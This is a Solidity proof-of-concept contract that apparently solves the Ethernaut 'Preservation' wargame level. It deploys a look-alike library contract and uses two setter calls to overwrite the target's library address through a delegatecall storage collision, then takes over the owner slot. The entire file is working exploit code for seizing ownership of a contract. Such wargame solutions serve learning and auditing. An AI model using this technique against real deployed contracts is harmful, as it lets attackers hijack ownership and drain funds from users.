pragma solidity ^0.8.24;

import "Ethernaut/preservation.sol";

import "forge-std/console.sol";

contract PreservationPoc 
{
  Preservation preservation;
  OwnerLibraryContract ownerLib;

  constructor(address _preservation) 
  {
    preservation = Preservation(_preservation);
    ownerLib = new OwnerLibraryContract();
  }

  function exploit(address newOwner) public
  {
    uint256 _timeStamp = uint256(uint160(address(ownerLib)));
    preservation.setSecondTime(_timeStamp);
    preservation.setFirstTime(uint256(uint160(newOwner)));
  }
}

contract OwnerLibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
} 